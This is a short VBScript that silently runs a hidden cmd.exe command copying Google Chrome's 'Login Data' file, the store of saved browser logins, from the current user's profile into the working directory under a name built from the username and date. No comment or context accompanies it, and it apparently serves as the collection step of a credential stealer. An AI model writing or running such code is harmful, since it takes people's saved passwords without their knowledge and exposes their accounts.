Set oShell = CreateObject ("WScript.Shell")
Dim command
command = "cmd.exe /C copy ""C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data"" "".\%USERNAME%-%date:~-4,4%%date:~-7,2%%date:~-10,2%"" "
oShell.Run command, 0, false